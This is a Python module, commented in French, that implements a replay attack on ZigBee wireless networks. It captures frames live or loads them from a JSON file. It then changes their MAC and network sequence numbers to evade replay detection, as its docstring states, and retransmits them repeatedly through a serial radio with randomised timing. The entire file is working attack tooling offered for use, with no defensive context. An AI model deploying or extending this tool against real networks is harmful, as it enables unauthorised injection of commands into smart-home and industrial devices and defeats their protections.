"""
Attaque de replay sur le réseau ZigBee.

Ce module implémente une attaque de replay sur le réseau ZigBee. Il permet de 
capturer des trames ZigBee, de les analyser, de les modifier et de les rejouer 
sur le réseau ZigBee. Il gère également les mécanismes de protection contre les 
attaques de type replay et permet de personnaliser la configuration de l'attaque.
"""
import sys
import os
import json
import logging
import random
import serial
import threading
import queue
import time
import hashlib
from typing import Dict, Optional, List

from CodeurTrame import CodeurTrameZigbee
from DecodeurTrame import DecodeurTrameZigbee
from sniff import SniffeurZigbee

# Configuration du logger
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('zigbee_advanced_replay.log', encoding='utf-8')
    ]
)
logger = logging.getLogger(__name__)

class ZigbeeReplayAttack:
    """
    Classe pour effectuer une attaque de replay sur le réseau ZigBee.
    
    Cette classe permet de capturer des trames ZigBee, de les analyser, 
    de les modifier (par exemple, en modifiant les numéros de séquence) 
    et de les rejouer sur le réseau ZigBee. Elle gère également les 
    mécanismes de protection contre les attaques de type replay et permet 
    de personnaliser la configuration de l'attaque.
    """

    def __init__(
        self, 
        capture_file: str = 'captures_zigbee.json', 
        channel: int = 13, 
        pan_id: int = 0x1900,
        serial_port: Optional[str] = None,
        aes_key: Optional[str] = None
    ):
        """
        Initialise l'attaque de replay ZigBee.

        Parameters
        ----------
        capture_file : str, optional
            Nom du fichier de capture pour stocker les trames ZigBee capturées.
            Par défaut 'captures_zigbee.json'.
        channel : int, optional
            Canal ZigBee sur lequel l'attaque de replay sera effectuée.
            Par défaut 13.
        pan_id : int, optional
            PAN ID du réseau ZigBee. Par défaut 0x1900.
        serial_port : str, optional
            Port série utilisé pour envoyer les trames de replay.
        aes_key : str, optional
            Clé AES pour la sécurité des trames, si applicable.
        """
        self.capture_file = capture_file
        self.channel = channel
        self.pan_id = pan_id
        self.serial_port = serial_port
        self.aes_key = aes_key
        
        # Initialisation des classes auxiliaires
        self.codeur = CodeurTrameZigbee(logger)
        self.decodeur = DecodeurTrameZigbee(logger)
        self.sniffer = SniffeurZigbee(
            canal=channel,
            fichier_sortie=capture_file,
            vitesse_bauds=115200
        )
        
        # Gestion des séquences et anti-replay
        self.sequence_base = None
        self.sequence_offset = 0
        self.captures = []
        self.replay_queue = queue.Queue()
        self.sequence_variations = []

    def capturer_trames_live(self, duree_capture: int = 10):
        """
        Capture live des trames ZigBee pendant une durée spécifiée.

        Parameters
        ----------
        duree_capture : int, optional
            Durée de la capture en secondes. Par défaut 10.
        """
        logger.info(f"Démarrage de la capture live pour {duree_capture} secondes")
        self.sniffer.demarrer_sniffer()
        time.sleep(duree_capture)
        self.sniffer.arreter_sniffer()
        self.sniffer.sauvegarder_captures()
        self.captures = self.sniffer.captures
        logger.info(f"Capture terminée : {len(self.captures)} trames capturées")

    def charger_captures(self):
        """
        Charge et analyse les captures ZigBee à partir d'un fichier JSON.

        Cette méthode lit le fichier de captures spécifié lors de l'initialisation
        et décode chaque trame pour préparer l'attaque de replay.
        """
        try:
            with open(self.capture_file, 'r', encoding='utf-8') as f:
                raw_captures = json.load(f)
                
            # Décoder chaque trame capturée
            self.captures = []
            for capture in raw_captures:
                if isinstance(capture, str):  # Si c'est une chaîne hex
                    trame_bytes = bytes.fromhex(capture)
                    trame_decodee = self.decodeur.decoder_trame_zigbee(trame_bytes)
                    if trame_decodee:
                        self.captures.append(trame_decodee)
                else:  # Si c'est déjà un dictionnaire décodé
                    self.captures.append(capture)
            
            # Extraire les séquences
            self._extraire_sequences()
            logger.info(f"Chargement réussi : {len(self.captures)} trames")
            
        except Exception as e:
            logger.error(f"Erreur lors du chargement des captures : {e}")
            self.captures = []

    def _extraire_sequences(self):
        """
        Extrait les numéros de séquence des trames capturées.

        Cette méthode privée analyse les trames capturées pour extraire
        les numéros de séquence et initialiser la séquence de base.
        """
        sequences = []
        for capture in self.captures:
            if capture['type_trame'] == 'Data':
                seq = capture['couche_mac'].get('numero_sequence')
                if seq is not None:
                    sequences.append(seq)
            elif 'sequence_number' in capture:
                sequences.append(capture['sequence_number'])
                
        if sequences:
            self.sequence_base = min(sequences)
            self._generer_variations_sequence()

    def _generer_variations_sequence(self):
        """
        Génère des variations de numéro de séquence basées sur la séquence de base.

        Cette méthode privée crée différentes variations des numéros de séquence
        pour éviter la détection des attaques de replay.
        """
        if not self.sequence_base:
            return
        
        variations = [
            self.sequence_base,
            (self.sequence_base + 1) % 256,
            (self.sequence_base + random.randint(2, 10)) % 256,
            self._generer_sequence_cryptographique()
        ]
        
        self.sequence_variations = variations
        logger.debug(f"Variations de séquence générées : {self.sequence_variations}")

    def _generer_sequence_cryptographique(self) -> int:
        """
        Génère un numéro de séquence cryptographiquement sûr.

        Returns
        -------
        int
            Numéro de séquence généré de manière cryptographique.
        """
        seed = hashlib.sha256(
            str(self.sequence_base).encode() + 
            str(time.time()).encode()
        ).digest()
        return int.from_bytes(seed[:1], byteorder='big')

    def preparer_trame_replay(self, trame_originale: dict) -> bytes:
        """
        Prépare une trame pour le replay en modifiant le numéro de séquence.

        Parameters
        ----------
        trame_originale : dict
            Trame ZigBee originale à modifier.

        Returns
        -------
        bytes
            Trame prête à être envoyée en replay.
        """
        sequence = random.choice(self.sequence_variations) if self.sequence_variations else random.randint(0, 255)
        
        # Modifier la séquence dans la trame
        if trame_originale['type_trame'] == 'Data':
            trame_originale['couche_mac']['numero_sequence'] = sequence
            trame_originale['couche_reseau']['sequence_number'] = sequence
        else:
            trame_originale['sequence_number'] = sequence
            
        # Encoder la trame modifiée
        return self.codeur.encoder_trame_zigbee(trame_originale)

    def preparer_trames_replay(self, nombre_trames: int = 20):
        """
        Prépare plusieurs trames pour le replay.

        Parameters
        ----------
        nombre_trames : int, optional
            Nombre de trames à préparer pour le replay. Par défaut 20.
        """
        self.replay_queue = queue.Queue()
        
        for _ in range(nombre_trames):
            if not self.captures:
                continue

            trame_originale = random.choice(self.captures)
            trame_modifiee = self.preparer_trame_replay(trame_originale)
            self.replay_queue.put(trame_modifiee)

    def envoyer_trames_replay(self, nombre_replays: int = 5):
        """
        Envoie les trames de replay via le port série.

        Parameters
        ----------
        nombre_replays : int, optional
            Nombre de fois que chaque trame sera envoyée. Par défaut 5.
        """
        try:
            with serial.Serial(self.serial_port, baudrate=115200, timeout=1) as ser:
                logger.info(f"Début du replay via {self.serial_port}")
                
                while not self.replay_queue.empty():
                    trame = self.replay_queue.get()
                    
                    for _ in range(nombre_replays):
                        # Construction de la trame complète avec en-tête
                        trame_complete = bytearray([
                            len(trame) + 3,  # Longueur
                            self.channel,    # Canal
                            self.pan_id >> 8,  # PAN ID (octet haut)
                            self.pan_id & 0xFF  # PAN ID (octet bas)
                        ])
                        trame_complete.extend(trame)
                        
                        # Envoi avec délai aléatoire
                        ser.write(trame_complete)
                        time.sleep(random.uniform(0.1, 0.5))
                        
                        logger.debug(f"Trame replay envoyée - Longueur: {len(trame_complete)}")
                        
        except Exception as e:
            logger.error(f"Erreur durant le replay : {e}")

    def lancer_attaque_replay(self, nombre_replays: int = 5, capture_live: bool = False):
        """
        Lance l'attaque de replay complète avec capture et envoi des trames.

        Parameters
        ----------
        nombre_replays : int, optional
            Nombre de fois que chaque trame sera envoyée. Par défaut 5.
        capture_live : bool, optional
            Si True, effectue une capture live des trames ZigBee. Par défaut False.
        """
        try:
            if capture_live:
                self.capturer_trames_live()
            else:
                self.charger_captures()
                
            if not self.captures:
                logger.error("Aucune trame à rejouer")
                return
                
            self.preparer_trames_replay()
            
            # Lancement du replay dans un thread séparé
            thread_replay = threading.Thread(
                target=self.envoyer_trames_replay, 
                kwargs={'nombre_replays': nombre_replays}
            )
            thread_replay.start()
            thread_replay.join()
            
        except Exception as e:
            logger.error(f"Échec de l'attaque de replay : {e}")